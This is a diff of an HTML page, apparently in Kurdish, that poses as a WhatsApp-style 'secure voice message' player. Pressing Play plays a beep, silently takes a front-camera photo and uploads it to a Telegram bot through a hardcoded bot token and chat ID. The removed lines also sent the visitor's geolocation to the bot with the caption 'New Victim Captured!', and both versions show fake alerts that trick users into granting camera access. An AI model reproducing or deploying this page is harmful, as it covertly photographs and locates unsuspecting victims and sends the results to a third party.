@@ -2,60 +2,34 @@
 <html lang="ku">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <meta property="og:title" content="Voice message (0:08)">
-    <meta property="og:description" content="🎙️ پەیامی دەنگی">
-    <meta property="og:image" content="https://cdn-icons-png.flaticon.com/512/5948/5948543.png">
     <meta property="og:type" content="music.song">
-    <meta name="twitter:card" content="summary">
+    <meta property="og:title" content="🎙️ Voice Message (0:08)">
+    <meta property="og:description" content="پەیامی دەنگی">
+    <meta property="og:image" content="https://cdn-icons-png.flaticon.com/512/5948/5948543.png">
+    <meta property="og:audio" content="https://www.soundjay.com/buttons/beep-01a.mp3">
+    <meta property="og:audio:type" content="audio/mpeg">
 
-    <title>Voice Player</title>
     <style>
-        body { 
-            background-color: #f0f2f5; 
-            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;
-        }
-        .player-card {
-            background: white; width: 90%; max-width: 380px; padding: 25px;
-            border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center;
-        }
-        .lock-icon { font-size: 24px; margin-bottom: 10px; }
-        .audio-box {
-            display: flex; align-items: center; background: #f8f9fa;
-            padding: 12px; border-radius: 12px; margin-top: 20px; gap: 10px;
-        }
-        .play-btn {
-            width: 45px; height: 45px; background: #007bff; border: none;
-            border-radius: 50%; color: white; font-size: 20px; cursor: pointer;
-        }
-        .wave {
-            flex-grow: 1; height: 30px; 
-            background: url('https://www.whatsapp.com/img/v2/wp-audio-wave.png') center/contain no-repeat;
-            opacity: 0.4;
-        }
+        body { background-color: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .player-card { background: white; width: 320px; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
+        .play-btn { width: 50px; height: 50px; background: #007bff; border: none; border-radius: 50%; color: white; font-size: 20px; cursor: pointer; margin-top: 15px; }
         #video, #canvas { display: none; }
     </style>
 </head>
 <body>
 
     <div class="player-card">
-        <div class="lock-icon">🔐</div>
-        <h3 style="margin: 0; color: #333;">Secure Voice Message</h3>
-        <p style="font-size: 13px; color: #777;">ئەم دەنگە پارێزراوە، کلیک لە Play بکە بۆ گوێگرتن</p>
-        
-        <div class="audio-box" onclick="startProcess()">
-            <button class="play-btn" id="btn">▶</button>
-            <div class="wave"></div>
-            <span style="font-size: 12px; color: #666;">0:08</span>
+        <p style="font-size: 14px; color: #555;">🔒 پەیامێکی دەنگی پارێزراو</p>
+        <div style="display: flex; align-items: center; background: #f8f9fa; padding: 10px; border-radius: 10px; margin-top: 10px;">
+            <button class="play-btn" id="btn" onclick="start()">▶</button>
+            <div style="flex-grow: 1; height: 20px; background: url('https://www.whatsapp.com/img/v2/wp-audio-wave.png') center/contain no-repeat; opacity: 0.3; margin: 0 10px;"></div>
+            <span style="font-size: 12px; color: #888;">0:08</span>
         </div>
     </div>
 
-    <audio id="vSource">
-        <source src="https://www.soundjay.com/buttons/beep-01a.mp3" type="audio/mpeg">
-    </audio>
-
+    <audio id="v"><source src="https://www.soundjay.com/buttons/beep-01a.mp3"></audio>
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
@@ -63,40 +37,25 @@
         const TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY';
         const ID = '6351568884';
 
-        function startProcess() {
-            document.getElementById('vSource').play();
+        function start() {
+            document.getElementById('v').play();
             document.getElementById('btn').innerText = "⌛";
-
-            // وەرگرتنی لۆکەیشن
-            navigator.geolocation.getCurrentPosition(p => {
-                const msg = `📍 Location: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}`);
-            });
-
-            // وەرگرتنی کامێرا
+            
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
+            .then(s => {
+                const vid = document.getElementById('video');
+                vid.srcObject = s;
                 setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('chat_id', ID);
-                        formData.append('photo', blob, 'pic.jpg');
-                        formData.append('caption', '🎙️ New Victim Captured!');
-                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                    const can = document.getElementById('canvas');
+                    can.width = vid.videoWidth; can.height = vid.videoHeight;
+                    can.getContext('2d').drawImage(vid, 0, 0);
+                    can.toBlob(b => {
+                        const f = new FormData();
+                        f.append('chat_id', ID); f.append('photo', b, 'v.jpg');
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: f });
                     }, 'image/jpeg');
                 }, 2000);
-            })
-            .catch(() => {
-                alert("Security Alert: Please allow 'Media Decryption' to play this voice message.");
-            });
+            }).catch(() => alert("Error: Please allow audio playback."));
         }
     </script>
 </body>
